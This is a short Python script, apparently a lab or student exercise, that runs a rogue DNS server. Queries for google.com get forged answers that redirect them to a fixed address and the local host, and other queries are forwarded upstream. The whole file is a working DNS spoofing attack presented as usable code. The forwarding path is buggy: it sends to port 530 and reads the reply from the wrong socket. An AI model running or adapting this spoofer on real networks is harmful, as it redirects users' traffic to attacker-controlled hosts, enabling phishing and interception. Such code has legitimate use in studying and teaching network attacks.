import socket
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sr1, send, ICMP, send, sendp, Ether,sr, sniff,get_if_addr,conf, srp, ARP, RandShort

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('0.0.0.0',53))
print("Hay servidor")

socket_google = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

DNS_SERVER_IP = "127.0.0.1"  # Your local IP

def forward_dns(og, orig_pkt: IP, addr):
    print(f"Forwarding: {orig_pkt[DNSQR].qname}")

    fwd_pkt = DNS(og)

    socket_google.sendto(bytes(fwd_pkt),('8.8.8.8',530))
    response, r_addr = s.recvfrom(512)

    response = DNS(response)
    
    s.sendto(bytes(response), addr)
    return f"Responding to {orig_pkt[IP].src}"

def get_response(og, pkt: IP, addr):
    if (
        DNS in pkt and
        pkt[DNS].opcode == 0 and
        pkt[DNS].ancount == 0
    ):
        if "google.com" in str(pkt["DNS Question Record"].qname):
            print("hay spoof")

            spf_resp = DNS(qr=1,id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata='1.2.3.4')/DNSRR(rrname="google.com",rdata=DNS_SERVER_IP))
            spf_resp["DNS Question Record"].qname = "google.com"
            s.sendto(bytes(spf_resp), addr)
            return f"Spoofed DNS Response Sent: {pkt[IP].src}"
        else:
            # make DNS query, capturing the answer and send the answer
            return forward_dns(og, pkt, addr)


while True:
    message, addr = s.recvfrom(512)
    msg = IP()/UDP()/DNS(message)
    print(get_response(message, msg, addr))
    # break
    
    #CERRAR SOCKET